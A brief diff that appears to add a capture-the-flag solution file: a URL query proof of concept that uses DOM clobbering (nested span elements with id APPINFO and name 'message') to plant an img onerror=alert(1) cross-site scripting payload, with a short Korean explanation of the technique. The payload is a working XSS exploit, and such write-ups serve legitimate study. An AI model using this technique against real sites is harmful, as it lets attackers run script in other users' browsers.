@@ -1,0 +1,9 @@
+PoC:
+?username=<span%20id=APPINFO><span%20id=APPINFO%20name=message%20title=%27<img%20src=x%20onerror=alert(1)>%27>
+
+
+풀이 설명:
+
+1. DOM Clobbering을 이용하여 APPINFO.message.title의 값을 임의로 설정할 수 있다.
+
+2. <span id=APPINFO><span id=APPINFO name=message title='<img src onerror=alert(1)>'>
